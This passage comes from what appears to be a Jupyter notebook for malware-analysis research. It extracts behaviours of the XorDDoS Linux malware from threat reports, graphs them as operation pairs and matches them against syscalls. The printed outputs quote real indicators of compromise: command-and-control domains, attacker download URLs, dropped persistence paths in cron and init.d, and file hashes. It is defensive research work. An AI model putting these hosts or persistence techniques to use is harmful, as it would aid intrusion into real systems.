    "        # }\n",
    "        pass\n",
    "    def addItem(self, item:str) -> str:\n",
    "        # item = self.prettifyName(item) # 先不在這做~\n",
    "        if item in self.mapper.keys():\n",
    "            return self.mapper.get(item)\n",
    "        self.mapper[item] = str(self.index_counter)\n",
    "        self.index_counter += 1\n",
    "        return str(self.index_counter - 1)\n",
    "    def getSymbol(self, item:str):\n",
    "        return self.mapper.get(item, None)\n",
    "    # def prettifyName(self, item:str) -> str:\n",
    "    #     changed = self.pretty_name.get(item, None)\n",
    "    #     if changed:\n",
    "    #         return changed\n",
    "    #     return item\n",
    "\n",
    "def draw_asg_op_graph(asg_OPset: list[OperationPair], family=None):\n",
    "    dot = graphviz.Digraph(f'{family}_asg_OPset', comment='The Operational Pair Graph') \n",
    "    dot.node('Start', label=\"Malware (Subject)\")\n",
    "    mapper = ItemMapper()\n",
    "    for op in asg_OPset:\n",
    "        node_id = mapper.addItem(op.object)\n",
    "        dot.node(node_id, label=prettifyName(op.object)) # rename partial regex\n",
    "        if op.action:\n",
    "            dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "\n",
    "    # dot.graph_attr.update(ratio=\"0.4\")\n",
    "    u = dot.unflatten(stagger=3, fanout=True)\n",
    "    display(u)\n",
    "    del mapper\n",
    "    return u\n",
    "\n",
    "def draw_ctd_op_graph(fset:FamilySet):\n",
    "    for rem in fset.rem_lst:\n",
    "        # doc_OPset\n",
    "        if rem.doc_OPset is None or len(rem.doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} raw doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_doc_OPset\n",
    "        if rem.match_doc_OPset is None or len(rem.match_doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.match_doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} matched doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_ASG_OPset\n",
    "        if rem.OPset_order_index is None or len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in [fset.sample.OPset_ordered[i] for i in rem.OPset_order_index]:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"matched ASG OPset for doc {rem.reportname}\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "    return\n",
    "\n",
    "draw_asg_op_graph(sample.OPset, family=family)\n",
    "draw_ctd_op_graph(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: print matched sentence for specific document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>report</th>\n",
       "      <th>word</th>\n",
       "      <th>verb</th>\n",
       "      <th>objectType</th>\n",
       "      <th>prettyReg</th>\n",
       "      <th>match</th>\n",
       "      <th>label</th>\n",
       "      <th>sentence</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>/usr/syno/etc/rc.d/s99po1kitd-update.sh</td>\n",
       "      <td>None</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/etc/rc</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>158.247.208.230</td>\n",
       "      <td>None</td>\n",
       "      <td>NET</td>\n",
       "      <td>ip_addr</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>hardcode</td>\n",
       "      <td>NET</td>\n",
       "      <td>ip_addr</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>table 2: data collected by the malware and sen...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>/proc/cpuinfo</td>\n",
       "      <td>extract</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/proc/</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>table 2: data collected by the malware and sen...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>uid</td>\n",
       "      <td>None</td>\n",
       "      <td>INFO</td>\n",
       "      <td>UID(\\$|\\.|$)</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>61</th>\n",
       "      <td>Xorddos-Trendmicro.csv</td>\n",
       "      <td>/var/run/gcc.pid</td>\n",
       "      <td>read</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/var/run/</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>creates symbolic links which points to the scr...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>62</th>\n",
       "      <td>Xorddos-Trendmicro.csv</td>\n",
       "      <td>/etc/cron.hourly/gcc.sh</td>\n",
       "      <td>drop</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/etc/cron</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>this backdoor drops the following files:  /et...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>63</th>\n",
       "      <td>Xorddos-Trendmicro.csv</td>\n",
       "      <td>{blocked}t456.com/dd.rar:1520</td>\n",
       "      <td>None</td>\n",
       "      <td>NET</td>\n",
       "      <td>[a-zA-z]:\\d{1,5}$</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>64</th>\n",
       "      <td>Xorddos-Trendmicro2.csv</td>\n",
       "      <td>http://122.51.133.49:10086/vip</td>\n",
       "      <td>wget</td>\n",
       "      <td>NET</td>\n",
       "      <td>ip_addr</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>afterwards, the attackers executed the followi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>65</th>\n",
       "      <td>Xorddos-Trendmicro2.csv</td>\n",
       "      <td>http://62.171.160.189/linux_arm</td>\n",
       "      <td>find</td>\n",
       "      <td>NET</td>\n",
       "      <td>ip_addr</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>indicators of compromise kaiji  file name\\tsh...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>66 rows × 8 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                     report                                     word  \\\n",
       "0       Xorddos-Intezer.csv  /usr/syno/etc/rc.d/s99po1kitd-update.sh   \n",
       "1       Xorddos-Intezer.csv                          158.247.208.230   \n",
       "2       Xorddos-Intezer.csv                                127.0.0.1   \n",
       "3       Xorddos-Intezer.csv                            /proc/cpuinfo   \n",
       "4       Xorddos-Intezer.csv                                      uid   \n",
       "..                      ...                                      ...   \n",
       "61   Xorddos-Trendmicro.csv                         /var/run/gcc.pid   \n",
       "62   Xorddos-Trendmicro.csv                  /etc/cron.hourly/gcc.sh   \n",
       "63   Xorddos-Trendmicro.csv            {blocked}t456.com/dd.rar:1520   \n",
       "64  Xorddos-Trendmicro2.csv           http://122.51.133.49:10086/vip   \n",
       "65  Xorddos-Trendmicro2.csv          http://62.171.160.189/linux_arm   \n",
       "\n",
       "        verb objectType          prettyReg  match  label  \\\n",
       "0       None       FILE            /etc/rc      0      0   \n",
       "1       None        NET            ip_addr      0      0   \n",
       "2   hardcode        NET            ip_addr      0      0   \n",
       "3    extract       FILE             /proc/      1      1   \n",
       "4       None       INFO       UID(\\$|\\.|$)      0      0   \n",
       "..       ...        ...                ...    ...    ...   \n",
       "61      read       FILE          /var/run/      1      1   \n",
       "62      drop       FILE          /etc/cron      1      1   \n",
       "63      None        NET  [a-zA-z]:\\d{1,5}$      0      0   \n",
       "64      wget        NET            ip_addr      1      1   \n",
       "65      find        NET            ip_addr      1      1   \n",
       "\n",
       "                                             sentence  \n",
       "0                                                None  \n",
       "1                                                None  \n",
       "2   table 2: data collected by the malware and sen...  \n",
       "3   table 2: data collected by the malware and sen...  \n",
       "4                                                None  \n",
       "..                                                ...  \n",
       "61  creates symbolic links which points to the scr...  \n",
       "62   this backdoor drops the following files:  /et...  \n",
       "63                                               None  \n",
       "64  afterwards, the attackers executed the followi...  \n",
       "65   indicators of compromise kaiji  file name\\tsh...  \n",
       "\n",
       "[66 rows x 8 columns]"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 存檔所有 doc_OPset\n",
    "def save_docOPset(fset: FamilySet):\n",
    "    data = []\n",
    "    for idx_rem, rem in enumerate(fset.rem_lst):\n",
    "        ctd_opset:list[OperationPair] = list(rem.doc_OPset)\n",
    "        for op in ctd_opset:\n",
    "            data.append({\n",
    "                'report': rem.reportname,\n",
    "                'word': op.original_object,\n",
    "                'verb': op.action,\n",
    "                'objectType': op.object_type,\n",
    "                'prettyReg': prettifyName(op.object),\n",
    "                'match': 1 if op in rem.match_doc_OPset else 0, # verb 是否有比對到 syscall\n",
    "                'label': 1 if op in rem.match_doc_OPset else 0, # 人工標記的標籤 暫時先跟系統判斷一樣\n",
    "                'sentence': \" \".join(op.original_sentence.splitlines()) if op.original_sentence else None # flatten the sentence segment\n",
    "            })\n",
    "    # print(data)\n",
    "    df = pd.DataFrame(data)\n",
    "    df.to_csv(f'./result/00_{family}_docOPset.csv', index=False)\n",
    "    return df\n",
    "\n",
    "save_docOPset(fset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Report: Xorddos-Ms.csv. Matched OP count: 11\n",
      "--\n",
      "OP #36 use /proc/ /proc/rs_dev\n",
      "\n",
      "xorddos uses /proc/rs_dev character device to communicate with the rootkit.\n",
      "--\n",
      "OP #30 create /var/ /var/run/.\n",
      "if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.\n",
      "--\n",
      "OP #29 create /var/run/ /var/run/.\n",
      "if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.\n",
      "--\n",
      "OP #38 fetch [a-zA-z]:\\d{1,5}$ www.enoan2107.com:3306\n",
      "after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server:\n",
      "www.enoan2107.com:3306\n",
      "www.gzcfr5axf6.com:3306\n",
      "malicious activity threads\n",
      "after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.\n",
      "--\n",
      "OP #31 create /run/ /var/run/.\n",
      "if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.\n",
      "--\n",
      "OP #33 perform ^chkconfig$ chkconfig\n",
      "additionally, it performs the following tasks on a provided $pid:\n",
      "\n",
      "fetches the process file name corresponding to the provided $pid\n",
      "deletes the file for the provided $pid\n",
      "deletes the installed init services:\n",
      "deletes /etc/init.d/<file_name>\n",
      "for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name>\n",
      "performs the command chkconfig –del <file_name>\n",
      "performs the command update-rc.d <file_name> remove\n",
      "ends the process that was provided as an argument.\n",
      "--\n",
      "OP #43 read /var/ /var/run/gcc.pid\n",
      "it performs the following tasks:\n",
      "\n",
      "reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.\n",
      "--\n",
      "OP #20 drop /etc/init.d/ /etc/init.d/hflggwyfsc.elf\n",
      "figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf\n",
      "\n",
      "--\n",
      "OP #42 read /var/run/ /var/run/gcc.pid\n",
      "it performs the following tasks:\n",
      "\n",
      "reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.\n",
      "--\n",
      "OP #49 drop /etc/cron /etc/cron.hourly/gcc.sh\n",
      "\n",
      "dropped files\n",
      "dropped file path\tfile type\tsha-256\n",
      "/etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf\n",
      "/etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459\n",
      "/lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432\n",
      "/run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c\n",
      "/usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a\n",
      "/usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7\n",
      "/usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489\n",
      "/usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd\n",
      "/usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7\n",
      "/usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4\n",
      "/tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25\n",
      "/usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "\n",
      "--\n",
      "OP #41 fetch /run/ /var/run/gcc.pid\n",
      "\n",
      " kill_process\n",
      "\n",
      "the kill_process thread performs the following tasks:\n",
      "\n",
      "decodes encrypted strings\n",
      "fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file\n",
      "fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so\n",
      "fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process\n",
      "reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:\n",
      "md5=\n",
      "filename=\n",
      "rmfile=\n",
      "denyip=\n",
      "tcp_thread\n",
      "\n",
      "the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().\n"
     ]
    }
   ],
   "source": [
    "# 印出特定 report 的 matched 句子\n",
    "report_id = 3\n",
    "reportname = fset.rem_lst[report_id].reportname\n",
    "print(f\"Report: {reportname}. Matched OP count: {len(fset.rem_lst[report_id].match_doc_OPset)}\")\n",
    "for i, op in enumerate(fset.rem_lst[report_id].match_doc_OPset):\n",
    "    print(f\"--\\nOP #{op.step_number} {op.action} {op.object} {op.original_object}\")\n",
    "    print(f\"{op.original_sentence}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "set()\n",
      "set()\n",
      "{<OP 3 act=None, obj=/etc/rc>, <OP 7 act=None, obj=ip_addr>, <OP 5 act=hardcode, obj=ip_addr>, <OP 6 act=extract, obj=/proc/>, <OP 1 act=None, obj=UID(\\$|\\.|$)>, <OP 2 act=None, obj=GID(\\$|\\.|$)>, <OP 4 act=None, obj=/etc/init.d/>}\n",
      "{<OP23 act=None, obj=/etc/cron>, <OP24 act=None, obj=/etc/rc>, <OP36 act=use, obj=/proc/>, <OP18 act=name, obj=/proc/>, <OP29 act=create, obj=/var/run/>, <OP 1 act=run, obj=/var/>, <OP38 act=fetch, obj=[a-zA-z]:\\d{1,5}$>, <OP33 act=perform, obj=^chkconfig$>, <OP35 act=use, obj=/proc/rs_dev>, <OP15 act=None, obj=/proc/>, <OP 4 act=m6_6n3, obj=/var/run/>, <OP43 act=read, obj=/var/>, <OP49 act=drop, obj=/etc/cron>, <OP41 act=fetch, obj=/run/>, <OP19 act=None, obj=/etc/init.d/>, <OP37 act=None, obj=/proc/rs_dev>, <OP10 act=assign, obj=GID(\\$|\\.|$)>, <OP14 act=check, obj=/proc/>, <OP32 act=None, obj=mem_addr>, <OP46 act=None, obj=/var/run/>, <OP 7 act=resolv.conf, obj=/var/run/>, <OP31 act=create, obj=/run/>, <OP 6 act=m6_6n3, obj=/run/>, <OP26 act=None, obj=update-rc.d>, <OP34 act=find, obj=^sh$>, <OP20 act=drop, obj=/etc/init.d/>, <OP51 act=download, obj=[a-zA-z]:\\d{1,5}$>, <OP40 act=fetch, obj=/var/>, <OP30 act=create, obj=/var/>, <OP48 act=None, obj=/run/>, <OP 5 act=m6_6n3, obj=/var/>, <OP 9 act=resolv.conf, obj=/run/>, <OP 3 act=relate, obj=/var/>, <OP 2 act=contain, obj=/var/>, <OP45 act=execute, obj=GID(\\$|\\.|$)>, <OP42 act=read, obj=/var/run/>, <OP27 act=install, obj=^chkconfig$>, <OP50 act=drop, obj=/run/>, <OP17 act=have, obj=/proc/>, <OP28 act=call, obj=/proc/>, <OP22 act=delete, obj=/etc/cron>, <OP47 act=None, obj=/var/>, <OP 8 act=resolv.conf, obj=/var/>, <OP16 act=have, obj=/proc/rs_dev>, <OP11 act=hook, obj=/proc/>, <OP21 act=pass, obj=/etc/cron>, <OP25 act=add, obj=^chkconfig$>, <OP12 act=provide, obj=/proc/>, <OP44 act=read, obj=/run/>, <OP39 act=fetch, obj=/var/run/>, <OP13 act=contain, obj=/proc/>}\n",
      "{<OP 3 act=None, obj=/etc/rc>, <OP 5 act=read, obj=/var/>, <OP 6 act=read, obj=/run/>, <OP 4 act=read, obj=/var/run/>, <OP 1 act=drop, obj=/etc/cron>, <OP 2 act=None, obj=[a-zA-z]:\\d{1,5}$>}\n",
      "{<OP 1 act=wget, obj=ip_addr>, <OP 2 act=find, obj=ip_addr>}\n"
     ]
    }
   ],
   "source": [
    "# 測試區\n",
    "for rem in fset.rem_lst:\n",
    "    print(rem.doc_OPset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>bin/sed</th>\n",
       "      <th>/etc/rc</th>\n",
       "      <th>/etc/init.d/</th>\n",
       "      <th>/proc/</th>\n",
       "      <th>/etc/sed</th>\n",
       "      <th>/selinux</th>\n",
       "      <th>/boot/</th>\n",
       "      <th>/proc/rs_dev</th>\n",
       "      <th>/boot/[a-z]{10}</th>\n",
       "      <th>/run/</th>\n",
       "      <th>...</th>\n",
       "      <th>^pipe(\\$|\\.|$)</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}</th>\n",
       "      <th>[a-zA-z]:\\d{1,5}$</th>\n",
       "      <th>port \\d{1,5}$</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d{1,5}$</th>\n",
       "      <th>0x[0-9a-zA-Z]{8}</th>\n",
       "      <th>UID(\\$|\\.|$)</th>\n",
       "      <th>GID(\\$|\\.|$)</th>\n",
       "      <th>permission(\\s|:)[0-9]{1,4}</th>\n",
       "      <th>match</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
